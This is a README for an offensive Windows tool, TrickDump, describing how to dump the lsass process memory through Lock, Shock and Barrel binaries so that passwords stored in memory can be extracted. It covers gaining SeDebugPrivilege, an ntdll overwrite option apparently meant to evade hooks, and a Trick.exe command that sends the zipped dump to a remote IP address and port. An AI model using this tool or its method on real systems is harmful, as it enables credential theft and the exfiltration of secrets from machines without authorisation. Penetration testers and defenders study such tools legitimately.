# TrickDump - "peb-unreadable" branch

Create the Minidump file when the PEB structure is unreadable:

- **Lock**: Get OS information using RtlGetVersion, like before **- No admin privilege needed!**

- **Shock**: Load *lsarv.dll* with LdrLoadDll in your process and get its address and size with NtQueryVirtualMemory (it will be the same address in the lsass process!) **- No admin privilege needed!**

- **Barrel**:  Get SeDebugPrivilege privilege with NtOpenProcessToken and NtAdjustPrivilegeToken, open a handle with NtOpenProcess and get information and dump memory regions using NtQueryVirtualMemory and NtReadVirtualMemory  **- Admin privilege needed.**


In this case we will only get the information for the lsass' module *lsasrv.dll*, which is the only one needed in the Minidump file to be able to extract the passwords stored in memory. If you want information from other modules you may repeat the process of loading other DLLs or think a different approach.

-------------------------

## Usage

Execute each binary:

```
Lock.exe [disk/knowndlls/debugproc]
```

```
Shock.exe [disk/knowndlls/debugproc]
```

```
Barrel.exe [disk/knowndlls/debugproc]
```

You can execute the programs directly without overwriting the ntdll.dll library:

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_peb1.png)

Or use one of the three different overwrite techniques:

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_peb2.png)

Then the Minidump file is generated:

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_peb3.png)

-------------------------

## All in one

If you prefer to execute only one binary, Trick.exe generates a ZIP file containing the 3 JSON files and the ZIP file with the memory regions:

```
Trick.exe [disk/knowndlls/debugproc] [IP_ADDRESS] [PORT]
```

You can create the ZIP file locally, optionally using a Ntdll overwrite method:

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_peb4.png)

Or send it to a remote port using the second and third parameter as the IP address and the port:

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_peb5.png)

In both cases you get a ZIP file like this, unzip it and create the Minidump file:

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_7.png)
